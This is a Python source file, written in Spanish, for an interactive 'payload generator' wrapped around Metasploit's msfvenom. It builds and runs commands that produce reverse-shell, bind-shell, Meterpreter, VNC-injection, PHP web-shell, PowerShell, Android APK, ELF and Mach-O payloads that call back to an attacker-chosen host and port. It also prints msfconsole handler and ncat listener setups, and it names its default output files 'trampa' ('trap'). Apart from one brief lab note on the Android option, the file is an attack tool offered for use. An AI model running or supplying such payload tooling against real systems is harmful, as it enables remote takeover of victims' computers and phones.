import os
import shutil
import json
import re
from datetime import datetime


def mostrar_banner():
    try:
        # Intentar cargar arte ASCII desde archivo
        archivo_ascii = "ascii-art (1).txt"
        if os.path.exists(archivo_ascii):
            with open(archivo_ascii, 'r', encoding='utf-8') as f:
                arte_ascii = f.read()
            print(arte_ascii)
        else:
            # Si no existe el archivo, usar arte ASCII por defecto
            banner = r"""
       .--.
      |o_o |
      |:_/ |
     //   \ \
    (|     | )
   /'\_   _/`\
   \___)=(___/

  🐧 Generador de Payloads - by Aaron G
    """
            print(banner)
    except Exception as e:
        # Si hay algún error, usar banner por defecto
        banner = r"""
       .--.
      |o_o |
      |:_/ |
     //   \ \
    (|     | )
   /'\_   _/`\
   \___)=(___/

  🐧 Generador de Payloads - by Aaron G
    """
        print(banner)


def log(comando):
    with open("payload_log.txt", "a") as f:
        f.write(comando + "\n")


def validar_ip(ip):
    """Valida si la IP ingresada tiene formato correcto"""
    partes = ip.split('.')
    if len(partes) != 4:
        return False
    for parte in partes:
        if not parte.isdigit():
            return False
        num = int(parte)
        if num < 0 or num > 255:
            return False
    return True


def validar_puerto(puerto):
    """Valida si el puerto está en el rango válido"""
    try:
        num = int(puerto)
        return 1 <= num <= 65535
    except ValueError:
        return False


def verificar_msfvenom():
    """Verifica si msfvenom está instalado y disponible"""
    if shutil.which("msfvenom") is None:
        print("\n❌ msfvenom no está instalado o no está en PATH.")
        print("💡 Por favor, instalá Metasploit Framework:")
        print("   - En Kali Linux: ya viene preinstalado")
        print("   - En Ubuntu/Debian: sudo apt install metasploit-framework")
        print("   - En Windows: descargá el instalador desde:")
        print("     https://www.metasploit.com/download")
        return False
    return True


def cargar_config_lab():
    """Carga configuración persistente de laboratorio (LHOST/LPORT)"""
    ruta = "lab_config.json"
    if os.path.exists(ruta):
        try:
            with open(ruta, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def guardar_config_lab(lhost, lport):
    """Guarda configuración persistente de laboratorio (LHOST/LPORT)"""
    data = {"LHOST": lhost, "LPORT": lport}
    try:
        with open("lab_config.json", "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


def sanitizar_nombre_archivo(nombre, prefijo, extension):
    """Sanitiza nombre de archivo y asegura extensión; usa timestamp si queda vacío"""
    nombre = (nombre or "").strip()
    nombre = re.sub(r"[^A-Za-z0-9._-]", "_", nombre)
    if not nombre:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"{prefijo}_{timestamp}.{extension}"
    if not nombre.lower().endswith(f".{extension}"):
        nombre = f"{nombre}.{extension}"
    return nombre


def imprimir_resumen_archivo(ruta):
    """Muestra ruta absoluta y tamaño del archivo, sugiere ADB si corresponde"""
    try:
        ruta_abs = os.path.abspath(ruta)
        if os.path.exists(ruta_abs):
            size = os.path.getsize(ruta_abs)
            print(f"📄 Archivo: {ruta_abs} ({size} bytes)")
            if shutil.which("adb") and ruta_abs.lower().endswith(".apk"):
                print(
                    "🔧 Sugerencia: instalar con `adb install` si ADB está configurado.")
        else:
            print("⚠️ No se encontró el archivo generado.")
    except Exception as e:
        print(f"⚠️ No se pudo obtener información del archivo: {e}")


def pedir_lhost(default=None):
    """Pide LHOST con validación y opción de usar valor por defecto"""
    while True:
        prompt = "LHOST (tu IP atacante)"
        if default:
            prompt += f" [Enter para usar {default}]"
        prompt += ": "
        valor = input(prompt).strip()
        if not valor and default:
            return default
        if validar_ip(valor):
            return valor
        print("❌ IP inválida. Ejemplo: 192.168.1.100")


def pedir_lport(default=None):
    """Pide LPORT con validación y opción de usar valor por defecto"""
    while True:
        prompt = "LPORT (puerto de escucha)"
        if default:
            prompt += f" [Enter para usar {default}]"
        prompt += ": "
        valor = input(prompt).strip()
        if not valor and default:
            return default
        if validar_puerto(valor):
            return valor
        print("❌ Puerto inválido. Debe estar entre 1 y 65535")


def normalizar_subopcion(menu, valor):
    """Convierte entradas '1/2/3/4' en 'menu.1/menu.2/...' y acepta ya formateadas"""
    v = (valor or "").strip()
    if not v:
        return v
    if v.isdigit():
        return f"{menu}.{v}"
    if v.startswith(f"{menu}."):
        return v
    return v


def mostrar_grid_payloads(payloads, color_n):
    reset = "\033[0m"
    c_code = "\033[36m"
    c_desc = "\033[90m"
    term_width = shutil.get_terminal_size((100, 20)).columns
    gap = 3
    col_w = (term_width - gap) // 2
    rows = (len(payloads) + 1) // 2
    for r in range(rows):
        li = r + 1
        left = payloads[r]
        left_text = f"{color_n}[{li}]{reset} {c_code}{left['code32']}{reset} {c_desc}- {left['desc']}{reset}"
        if r + rows < len(payloads):
            ri = r + 1 + rows
            right = payloads[r + rows]
            right_text = f"{color_n}[{ri}]{reset} {c_code}{right['code32']}{reset} {c_desc}- {right['desc']}{reset}"
        else:
            right_text = ""
        print(left_text.ljust(col_w) + " " * gap + right_text)

def detectar_arch_por_objetivo():
    sel = input("Objetivo: [1] Windows 7 x86  [2] Windows 10 x64  [3] Otro: ").strip()
    if sel == "1":
        return False
    if sel == "2":
        return True
    arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits: ").strip()
    return arch_sel == "2"

def mensaje_handler(code, lhost, lport):
    if "vncinject/reverse_tcp" in code:
        return (
            "\nHandler msfconsole (VNC):\n"
            "use exploit/multi/handler\n"
            "set payload windows/vncinject/reverse_tcp\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "run -j\n"
            "\nInstalá un viewer VNC en la máquina atacante para visualizar la sesión.\n"
            "\nSi la GUI no abre en Win7 x86, probá:\n"
            "use exploit/multi/handler\n"
            "set payload windows/meterpreter/reverse_tcp\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "run\n"
            "\nDentro de meterpreter:\n"
            "run vnc\n"
        )
    if "powershell_reverse_tcp" in code:
        return (
            "\nHandler msfconsole (PowerShell):\n"
            "use exploit/multi/handler\n"
            "set payload windows/powershell_reverse_tcp\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "run\n"
        )
    if "shell_reverse_tcp" in code:
        return (
            "\nHandler msfconsole (Shell):\n"
            "use exploit/multi/handler\n"
            "set payload windows/shell_reverse_tcp\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "run\n"
            "\nAlternativa listener:\n"
            f"ncat -lvkp {lport}\n"
        )
    if "meterpreter_reverse_tcp" in code or "meterpreter/reverse_tcp" in code:
        return (
            "\nHandler msfconsole (Meterpreter TCP):\n"
            "use exploit/multi/handler\n"
            f"set payload {code}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "run\n"
        )
    if "reverse_http" in code or "reverse_https" in code:
        return (
            "\nHandler msfconsole (Meterpreter HTTP/HTTPS):\n"
            "use exploit/multi/handler\n"
            f"set payload {code}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "run\n"
        )
    if "bind_tcp" in code:
        return (
            "\nHandler msfconsole (Bind TCP):\n"
            "use exploit/multi/handler\n"
            f"set payload {code}\n"
            f"set LPORT {lport}\n"
            "set ExitOnSession false\n"
            "run\n"
        )
    return (
        "\nHandler msfconsole (Genérico):\n"
        "use exploit/multi/handler\n"
        f"set payload {code}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        "set ExitOnSession false\n"
        "run\n"
    )

def generar_payload():
    # Cargar últimos valores de laboratorio, si existen
    _cfg = cargar_config_lab()
    ultimo_lhost = _cfg.get("LHOST")
    ultimo_lport = _cfg.get("LPORT")
    while True:
        mostrar_banner()
        print("\n--- Generador de Payloads ---")
        print("1. Listar todos los payloads disponibles")
        print("2. Filtrar solo los payloads para Windows")
        print("3. Generar payload .exe")
        print("4. Windows")
        print("5. Linux")
        print("6. Android")
        print("7. MacOS")
        print("8. PHP, PowerShell y Personalizado")
        print("9. Todos los payloads (guía)")
        print("0. Salir")
        opcion = input("Selecciona una opción: ").strip()

        if opcion == "0":
            print("👋 Cerrando el generador. ¡Hasta la próxima, Mariano!")
            break

        elif opcion == "1":
            if verificar_msfvenom():
                os.system("msfvenom -l payloads")
            input("\nPresioná Enter para volver al menú...")

        elif opcion == "2":
            color_n = "\033[38;5;208m"
            reset = "\033[0m"
            payloads = [
                {"code32": "windows/meterpreter/reverse_tcp", "code64": "windows/x64/meterpreter/reverse_tcp", "desc": "Meterpreter inverso TCP", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/meterpreter/reverse_http", "code64": "windows/x64/meterpreter/reverse_http", "desc": "Meterpreter inverso HTTP", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/meterpreter/reverse_https", "code64": "windows/x64/meterpreter/reverse_https", "desc": "Meterpreter inverso HTTPS", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/meterpreter_reverse_tcp", "code64": "windows/x64/meterpreter_reverse_tcp", "desc": "Meterpreter sin etapas TCP", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/shell_reverse_tcp", "code64": "windows/x64/shell_reverse_tcp", "desc": "Shell inversa TCP", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/powershell_reverse_tcp", "code64": None, "desc": "PowerShell inversa TCP", "ext": "ps1", "redirect": True, "needs_lhost": True},
                {"code32": "windows/shell/bind_tcp", "code64": "windows/x64/shell_bind_tcp", "desc": "Shell bind TCP", "ext": "exe", "redirect": False, "needs_lhost": False},
                {"code32": "windows/meterpreter/bind_tcp", "code64": "windows/x64/meterpreter/bind_tcp", "desc": "Meterpreter bind TCP", "ext": "exe", "redirect": False, "needs_lhost": False},
                {"code32": "windows/vncinject/reverse_tcp", "code64": "windows/x64/vncinject/reverse_tcp", "desc": "VNC inverso", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/shell/reverse_tcp_ipv6", "code64": None, "desc": "Shell inversa IPv6", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/dns/txt/reverse_tcp", "code64": None, "desc": "DNS TXT inverso", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/shell/reverse_udp", "code64": None, "desc": "Shell inversa UDP", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/meterpreter/reverse_tcp_uuid", "code64": "windows/x64/meterpreter/reverse_tcp_uuid", "desc": "Meterpreter TCP con UUID", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/meterpreter/reverse_winhttp", "code64": None, "desc": "Meterpreter WinHTTP", "ext": "exe", "redirect": False, "needs_lhost": True},
                {"code32": "windows/meterpreter/reverse_winhttps", "code64": None, "desc": "Meterpreter WinHTTPS", "ext": "exe", "redirect": False, "needs_lhost": True},
            ]
            print("\n════════════════════════════════════════════════════════════════════════════════")
            print("  Payloads de Windows")
            print("════════════════════════════════════════════════════════════════════════════════")
            mostrar_grid_payloads(payloads, color_n)
            print("════════════════════════════════════════════════════════════════════════════════")
            eleccion = input("\nElegí un número: ").strip()
            if not eleccion.isdigit():
                print("Opción inválida.")
                input("\nPresioná Enter para volver al menú...")
                continue
            idx = int(eleccion)
            if idx < 1 or idx > len(payloads):
                print("Opción inválida.")
                input("\nPresioná Enter para volver al menú...")
                continue
            seleccionado = payloads[idx - 1]
            usar64_default = detectar_arch_por_objetivo()
            arch_sel = input("Arquitectura ([Enter] para usar detección): ").strip()
            usar64 = usar64_default if not arch_sel else arch_sel == "2"
            lhost = pedir_lhost(ultimo_lhost)
            lport = pedir_lport(ultimo_lport)
            nombre_raw = input("Nombre del archivo de salida: ").strip()
            prefijo = "payload_win" if seleccionado["ext"] != "ps1" else "payload_ps1"
            archivo = sanitizar_nombre_archivo(nombre_raw, prefijo, seleccionado["ext"])
            code = seleccionado["code64"] if usar64 and seleccionado["code64"] else seleccionado["code32"]
            arch_flag = "-a x64" if usar64 else "-a x86"
            plat_flag = "--platform windows"
            if seleccionado["redirect"]:
                if seleccionado["needs_lhost"]:
                    comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} > {archivo}"
                else:
                    comando = f"msfvenom -p {code} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} > {archivo}"
            else:
                oflag = f"-o {archivo}" if seleccionado['ext'] != 'ps1' else f"> {archivo}"
                if seleccionado["needs_lhost"]:
                    comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} {oflag}"
                else:
                    comando = f"msfvenom -p {code} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} {oflag}"
            mensaje_post = None
            if "vncinject/reverse_tcp" in code:
                mensaje_post = (
                    "\nHandler msfconsole (VNC):\n"
                    "use exploit/multi/handler\n"
                    "set payload windows/vncinject/reverse_tcp\n"
                    f"set LHOST {lhost}\n"
                    f"set LPORT {lport}\n"
                    "set ExitOnSession false\n"
                    "run -j\n"
                    "\nNecesitás un viewer VNC instalado (ej: tigervnc-viewer/realvnc) para que se abra la ventana.\n"
                )
            elif "shell_reverse_tcp" in code:
                mensaje_post = (
                    "\nHandler msfconsole (Shell):\n"
                    "use exploit/multi/handler\n"
                    "set payload windows/shell_reverse_tcp\n"
                    f"set LHOST {lhost}\n"
                    f"set LPORT {lport}\n"
                    "set ExitOnSession false\n"
                    "run\n"
                    "\nAlternativa listener simple:\n"
                    f"ncat -lvkp {lport}\n"
                )
            if verificar_msfvenom():
                print(f"\nEjecutando:\n{comando}\n")
                log(comando)
                os.system(comando)
                guardar_config_lab(lhost, lport)
                imprimir_resumen_archivo(archivo)
                mh = mensaje_handler(code, lhost, lport)
                if mh:
                    print(mh)
            input("\nPayload generado (si no hubo errores). Presioná Enter para volver al menú...")

        elif opcion == "3":
            lhost = pedir_lhost(ultimo_lhost)
            lport = pedir_lport(ultimo_lport)

            # Preguntar por el nombre del archivo
            print("\n¿Qué nombre querés para el archivo .exe?")
            print("1. Usar nombre personalizado")
            print("2. Usar nombre automático con timestamp")
            nombre_opcion = input("Seleccioná una opción (1 o 2): ").strip()

            if nombre_opcion == "1":
                nombre_raw = input(
                    "Ingresá el nombre del archivo (sin .exe): ").strip()
                filename = sanitizar_nombre_archivo(
                    nombre_raw, "trampa", "exe")
            else:
                filename = sanitizar_nombre_archivo("", "trampa", "exe")
            usar64_default = detectar_arch_por_objetivo()
            arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits (Enter=auto): ").strip()
            usar64 = usar64_default if not arch_sel else arch_sel == "2"
            code = "windows/x64/shell_reverse_tcp" if usar64 else "windows/shell_reverse_tcp"
            comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} --platform windows {'-a x64' if usar64 else '-a x86'} -f exe -o {filename}"
            if verificar_msfvenom():
                print(f"\nEjecutando:\n{comando}\n")
                log(comando)
                os.system(comando)
                guardar_config_lab(lhost, lport)
                imprimir_resumen_archivo(filename)
                print(mensaje_handler(code, lhost, lport))
            input("\nPayload generado. Presioná Enter para volver al menú...")

        elif opcion == "9":
            print("\n🧩 Paso a paso técnico para generar payloads con msfvenom:")
            print("msfvenom -l payloads")
            print("msfvenom -l payloads | grep windows")
            print(
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=444 -f exe -o trampa.exe")
            input("\nPresioná Enter para volver al menú...")
            continue

        elif opcion in ["4", "5", "6", "7", "8"]:
            lhost = pedir_lhost(ultimo_lhost)
            lport = pedir_lport(ultimo_lport)

            autor = "echo 'Payload creado por Aaron G'"
            comando = None
            mensaje_post = None

            if opcion == "4":
                print("4.1 Meterpreter Reverse TCP")
                print("4.2 Shell Reverse TCP")
                print("4.3 Meterpreter Reverse HTTPS")
                print("4.4 Shell Bind TCP")
                print("4.5 MessageBox")
                subopcion = input("Tipo de payload: ")
                subopcion = normalizar_subopcion("4", subopcion)
                output_raw = input("Nombre del archivo .exe: ")
                archivo = sanitizar_nombre_archivo(
                    output_raw, "payload_win", "exe")
                usar64_default = detectar_arch_por_objetivo()
                arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits (Enter=auto): ").strip()
                usar64 = usar64_default if not arch_sel else arch_sel == "2"
                arch_flag = "-a x64" if usar64 else "-a x86"
                plat_flag = "--platform windows"

                if subopcion == "4.1":
                    code = "windows/x64/meterpreter/reverse_tcp" if usar64 else "windows/meterpreter/reverse_tcp"
                    comando = f"{autor} && msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "4.2":
                    code = "windows/x64/shell_reverse_tcp" if usar64 else "windows/shell_reverse_tcp"
                    comando = f"{autor} && msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "4.3":
                    code = "windows/x64/meterpreter/reverse_https" if usar64 else "windows/meterpreter/reverse_https"
                    comando = f"{autor} && msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "4.4":
                    code = "windows/x64/shell_bind_tcp" if usar64 else "windows/shell/bind_tcp"
                    comando = f"{autor} && msfvenom -p {code} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "4.5":
                    mensaje = input("Mensaje personalizado: ")
                    code = "windows/messagebox"
                    comando = f"{autor} && msfvenom -p {code} TEXT=\"{mensaje}\" {plat_flag} {arch_flag} -f exe -o {archivo}"
                    archivo_generado = archivo
                else:
                    print("Subopción inválida.")
                    input("\nPresioná Enter para volver al menú...")
                    continue

                print(mensaje_handler(code, lhost, lport))

            elif opcion == "5":
                print("5.1 Shell Reverse TCP (ELF)")
                print("5.2 Shell Bind TCP (ELF)")
                print("5.3 Meterpreter Reverse TCP (ELF)")
                print("5.4 Listar payloads Linux")
                subopcion = input("Tipo de payload: ").strip()
                subopcion = normalizar_subopcion("5", subopcion)

                if subopcion in ["5.1", "5.2", "5.3"]:
                    output_raw = input("Nombre del archivo .elf: ").strip()
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_linux", "elf")
                    if subopcion == "5.1":
                        comando = f"{autor} && msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {archivo}"
                    elif subopcion == "5.2":
                        comando = f"{autor} && msfvenom -p linux/x86/shell_bind_tcp LPORT={lport} -f elf -o {archivo}"
                    elif subopcion == "5.3":
                        comando = f"{autor} && msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "5.4":
                    if verificar_msfvenom():
                        filtro_cmd = (
                            "msfvenom -l payloads | grep linux"
                            if os.name != "nt"
                            else "msfvenom -l payloads | findstr /i linux"
                        )
                        os.system(filtro_cmd)
                    input("\nPresioná Enter para volver al menú...")
                    continue
                else:
                    print("Subopción inválida.")
                    input("\nPresioná Enter para volver al menú...")
                    continue

            elif opcion == "6":
                print("6.1 Meterpreter Reverse TCP")
                print("6.2 Shell Reverse TCP")
                print("6.3 Listar payloads Android")
                print("6.4 APK de prueba (laboratorio)")
                subopcion = input("Tipo de payload: ").strip()
                subopcion = normalizar_subopcion("6", subopcion)

                if subopcion in ["6.1", "6.2"]:
                    output_raw = input("Nombre del archivo .apk: ").strip()
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_android", "apk")
                    if subopcion == "6.1":
                        comando = f"{autor} && msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {archivo}"
                    elif subopcion == "6.2":
                        comando = f"{autor} && msfvenom -p android/shell/reverse_tcp LHOST={lhost} LPORT={lport} -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "6.3":
                    if verificar_msfvenom():
                        filtro_cmd = (
                            "msfvenom -l payloads | grep android"
                            if os.name != "nt"
                            else "msfvenom -l payloads | findstr /i android"
                        )
                        os.system(filtro_cmd)
                    input("\nPresioná Enter para volver al menú...")
                    continue
                elif subopcion == "6.4":
                    output_raw = input(
                        "Nombre del archivo .apk (ej: laboratorio_apk): ").strip()
                    archivo = sanitizar_nombre_archivo(
                        output_raw or "laboratorio_apk", "laboratorio_apk", "apk")
                    comando = f"{autor} && msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {archivo}"
                    archivo_generado = archivo
                    mensaje_post = (
                        "\n📱 Instrucciones de laboratorio para probar el APK en tu propio dispositivo:\n"
                        "- Usa solo en dispositivos propios y con consentimiento.\n"
                        "- Habilitá la instalación de orígenes desconocidos en tu dispositivo.\n"
                        f"- Instalar con ADB: `adb install {archivo}` (si usás ADB).\n"
                        "- Iniciar listener en tu lab (ejemplo en msfconsole):\n"
                        "  use exploit/multi/handler\n"
                        "  set payload android/meterpreter/reverse_tcp\n"
                        f"  set LHOST {lhost}\n"
                        f"  set LPORT {lport}\n"
                        "  run\n"
                    )
                else:
                    print("Subopción inválida.")
                    input("\nPresioná Enter para volver al menú...")
                    continue

            elif opcion == "7":
                print("7.1 Python Reverse TCP")
                print("7.2 Mach-O Reverse TCP")
                print("7.3 Shell Bind TCP")
                subopcion = input("Tipo de payload: ")
                subopcion = normalizar_subopcion("7", subopcion)
                output_raw = input("Nombre del archivo: ")

                if subopcion == "7.1":
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_py", "py")
                    comando = f"{autor} && msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > {archivo}"
                    archivo_generado = archivo
                elif subopcion == "7.2":
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_macho", "macho")
                    comando = f"{autor} && msfvenom -p osx/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o {archivo}"
                    archivo_generado = archivo
                elif subopcion == "7.3":
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_macho", "macho")
                    comando = f"{autor} && msfvenom -p osx/x64/shell_bind_tcp LPORT={lport} -f macho -o {archivo}"
                    archivo_generado = archivo
                else:
                    print("Subopción inválida.")
                    input("\nPresioná Enter para volver al menú...")
                    continue

            elif opcion == "8":
                print("8.1 PHP Webshell")
                print("8.2 PowerShell Reverse TCP")
                print("8.3 Personalizado")
                subopcion = input("Tipo de payload: ")
                subopcion = normalizar_subopcion("8", subopcion)

                if subopcion == "8.1":
                    output_raw = input("Nombre del archivo .php: ")
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_php", "php")
                    comando = f"{autor} && msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > {archivo}"
                    archivo_generado = archivo
                elif subopcion == "8.2":
                    output_raw = input("Nombre del archivo .ps1: ")
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_ps1", "ps1")
                    comando = f"{autor} && msfvenom -p windows/powershell_reverse_tcp LHOST={lhost} LPORT={lport} -f ps1 > {archivo}"
                    archivo_generado = archivo
                elif subopcion == "8.3":
                    payload = input("Payload personalizado: ")
                    formato = input("Formato (exe, elf, raw, etc): ")
                    output_raw = input("Nombre del archivo: ")
                    archivo = sanitizar_nombre_archivo(
                        output_raw, "payload_custom", formato)
                    comando = f"{autor} && msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {formato} -o {archivo}"
                    archivo_generado = archivo
                else:
                    print("Subopción inválida.")
                    input("\nPresioná Enter para volver al menú...")
                    continue

            # Ejecutar comando si fue definido
            if comando:
                if verificar_msfvenom():
                    print(f"\nEjecutando:\n{comando}\n")
                    log(comando)
                    os.system(comando)
                    guardar_config_lab(lhost, lport)
                    if mensaje_post:
                        print(mensaje_post)
                    if 'archivo_generado' in locals() and archivo_generado:
                        imprimir_resumen_archivo(archivo_generado)
                    input(
                        "\nPayload generado (si no hubo errores). Presioná Enter para volver al menú...")
            else:
                print("No se pudo generar el comando.")
                input("\nPresioná Enter para volver al menú...")

        else:
            print("Opción inválida. Por favor, seleccioná una opción válida.")
            input("\nPresioná Enter para continuar...")


if __name__ == "__main__":
    print("🚀 Iniciando Generador de Payloads...")
    print("💡 Consejo: Asegurate de tener Metasploit Framework instalado")
    print("📝 Los comandos se guardarán en 'payload_log.txt'")
    print("=" * 60)
    generar_payload()
